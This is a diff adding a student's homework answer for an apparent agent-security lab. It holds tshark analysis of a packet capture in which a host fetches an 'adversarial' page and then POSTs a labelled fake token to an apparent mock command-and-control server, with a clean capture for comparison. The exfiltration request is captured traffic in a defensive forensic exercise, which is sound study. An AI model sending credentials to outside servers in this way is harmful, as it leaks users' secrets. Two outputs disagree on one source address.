@@ -94,7 +94,64 @@ ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ docker compose exec mock-c2 sh
 
 TASK 2:
 
-ASDFGHJJ
+tshark -r hw4-malicious.pcap -Y http -T fields -e frame.number -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport -e http.request.method -e http.request.uri
+4	172.30.0.1	49876	172.30.0.40	8000	GET	/adversarial.html
+8	172.30.0.40	8000	172.30.0.1	49876		
+16	172.30.0.10	42570	172.30.0.66	8080	POST	/
+18	172.30.0.66	8080	172.30.0.10	42570	
+
+ls -lh hw4-malicious.pcap
+-rw-r--r-- 1 tcpdump tcpdump 3.0K Nov 20 14:32 hw4-malicious.pcap
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ tshark -r hw4-malicious.pcap -Y http -T fields -e frame.number -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport -e http.request.method -e http.request.uri
+4	172.30.0.10	49876	172.30.0.40	8000	GET	/adversarial.html
+8	172.30.0.40	8000	172.30.0.1	49876		
+16	172.30.0.10	42570	172.30.0.66	8080	POST	/
+18	172.30.0.66	8080	172.30.0.10	42570		
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ tshark -r hw4-malicious.pcap -Y 'http.request.method == "POST"' -T fields -e tcp.stream
+1
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ tshark -r hw4-malicious.pcap -q -z follow,tcp,ascii,1
+
+===================================================================
+Follow: tcp,ascii
+Filter: tcp.stream eq 1
+Node 0: 172.30.0.10:42570
+Node 1: 172.30.0.66:8080
+185
+POST / HTTP/1.1
+Host: 172.30.0.66:8080
+User-Agent: curl/8.14.1
+Accept: */*
+Content-Length: 35
+Content-Type: application/x-www-form-urlencoded
+
+CSCE465-FAKE-TOKEN-2f67e97a501147ce
+	101
+HTTP/1.0 204 No Content
+Server: BaseHTTP/0.6 Python/3.12.16
+Date: Fri, 20 Nov 2026 19:32:09 GMT
+
+
+===================================================================
+
+tshark -r hw4-malicious.pcap -Y 'tcp.stream == 1' -T fields -e frame.number -e frame.time
+13	Nov 20, 2026 14:32:09.417365000 EST
+14	Nov 20, 2026 14:32:09.417441000 EST
+15	Nov 20, 2026 14:32:09.417478000 EST
+16	Nov 20, 2026 14:32:09.418432000 EST
+17	Nov 20, 2026 14:32:09.418451000 EST
+18	Nov 20, 2026 14:32:09.420826000 EST
+19	Nov 20, 2026 14:32:09.420907000 EST
+20	Nov 20, 2026 14:32:09.420984000 EST
+21	Nov 20, 2026 14:32:09.421407000 EST
+22	Nov 20, 2026 14:32:09.421449000 EST
+
+
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ tshark -r hw4-clean.pcap -Y 'http.request.method == "POST"'
+ubuntu@ubuntu2204:~/465-hw4/csce465-agentsec/hw4$ tshark -r hw4-clean.pcap -Y http -T fields -e ip.src -e ip.dst -e http.request.method -e http.request.uri
+172.30.0.10	172.30.0.40	GET	/benign.html
+172.30.0.40	172.30.0.10		
+
+
 
 TASK 3:
 
